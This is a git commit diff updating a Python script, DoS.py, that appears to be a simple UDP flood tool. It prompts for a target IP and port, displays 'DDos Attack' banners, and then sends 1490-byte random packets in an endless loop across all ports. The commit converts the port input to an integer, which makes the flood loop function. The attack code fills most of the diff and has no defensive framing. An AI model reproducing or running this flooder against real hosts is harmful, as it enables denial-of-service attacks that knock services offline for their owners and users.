1166515c9ee07dc43a6562336ab94ceac1d26f43
Tuhermanofeo <gonzabayj83@gmail.com>
2025-10-23 13:53:27 -0500

    Update DoS.py

--- DoS.py
+++ DoS.py
@@ -3,8 +3,9 @@ import os
 import time
 import socket
 import random
-#Code Time
 from datetime import datetime
+
+# Obtener fecha y hora actual
 now = datetime.now()
 hour = now.hour
 minute = now.minute
@@ -13,7 +14,7 @@ month = now.month
 year = now.year
 
 ################
-print(f"executed in: {day}/{month}/{year}")
+print(f"Executed on: {day}/{month}/{year}")
 time.sleep(3)
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -23,10 +24,11 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print("Dev: Tuhermanofeo")
-print("github: https://github.com/tuhermanofeo")
-print("                                           ")
+print("GitHub: https://github.com/tuhermanofeo")
+print("")
+
 ip = input("IP Target : ")
-port = input("Port       : ")
+port = int(input("Port       : "))  # <--- convertir a entero
 
 os.system("clear") 
 os.system("figlet Attack Starting")
@@ -40,13 +42,13 @@ print("[===============     ] 75%")
 time.sleep(5)
 print("[====================] 100%")
 time.sleep(3)
+
 sent = 0
+
 while True:
     sock.sendto(bytes, (ip, port))
-    sent = sent + 1
+    sent += 1
     print("Sent %s packet to %s through port: %s" % (sent, ip, port))
-    port = port + 1
+    port += 1
     if port == 65534:
         port = 1
-
-
